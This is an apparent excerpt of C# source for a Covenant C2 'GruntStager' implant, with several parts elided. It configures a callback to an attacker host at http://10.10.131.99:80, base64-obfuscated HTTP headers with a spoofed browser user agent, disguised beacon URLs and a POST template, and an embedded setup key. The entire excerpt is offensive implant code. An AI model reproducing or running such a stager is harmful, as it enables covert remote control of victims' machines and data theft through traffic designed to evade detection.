...
namespace GruntStager
{
    public class GruntStager
        {
            ...
            public void ExecuteStager()
            {
                try
                {
                    List<string> CovenantURIs = @"http://10.10.131.99:80".Split(',').ToList();
                    string CovenantCertHash = @"";
                    List<string> ProfileHttpHeaderNames = @"QWNjZXB0LUVuY29kaW5n,VXNlci1BZ2VudA==".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
                    List<string> ProfileHttpHeaderValues = @"dXRmLTgsIGlzby04ODU5LTE7cT0wLjU=,TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNDEuMC4yMjI4LjAgU2FmYXJpLzUzNy4zNg==".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
                    List<string> ProfileHttpUrls = @"L2VuLXUxcy9pbmQxMWV4Lmh0bWw/cGFnZT17R1VJRH0mdj0xMTEx,L2VuLXUxcy9kb2MxMXMuaHRtbD90eXBlPXtHVUlEfSZ2PTExMTEx,L2VuLXUxcy90ZXMxMXQuaHRtbD9tZXNzYWdlPXtHVUlEfSZ2PTExMTE=".Split(',').ToList().Select(U => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(U))).ToList();
                    string ProfileHttpPostRequest = @"i=asddasasddasd&data={0}&session=7asdasdasd5db-99b1-25fe4e9aasddasasddasdfbe58696-320basdasdasdea73".Replace(Environment.NewLine, "\n");
	...
	{0}
                    ...
                    string aGUID = @"fddfe3d898";
                    string GUID = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10);
                    byte[] SetupKeyBytes = Convert.FromBase64String(@"7GYsdHM+r741xvEymHDVb6n5wdX89x7g4+R35PENS8o=");
